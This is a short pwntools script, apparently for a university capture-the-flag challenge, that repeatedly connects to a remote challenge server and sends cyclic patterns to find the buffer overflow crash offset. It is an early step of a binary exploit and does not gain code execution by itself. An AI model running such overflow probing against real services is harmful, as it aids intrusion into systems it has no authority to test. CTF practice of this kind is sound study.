from pwn import *

OFFSET_MIN = 0
OFFSET_MAX = 100

def start():
	return remote("cse4850-bin9.chals.io", 443, ssl=True, sni="cse4850-bin9.chals.io")

def find_offset():
    for i in range(OFFSET_MIN, OFFSET_MAX):
        log.info('\tTrying to crash program with %i bytes' % i)
        with context.quiet:
            p = start()
            p.sendlineafter(b'start: ', cyclic(i))
            try:
                p.recvline()
            except EOFError:
                return int(i/8)*8

offset = find_offset()

print(offset)
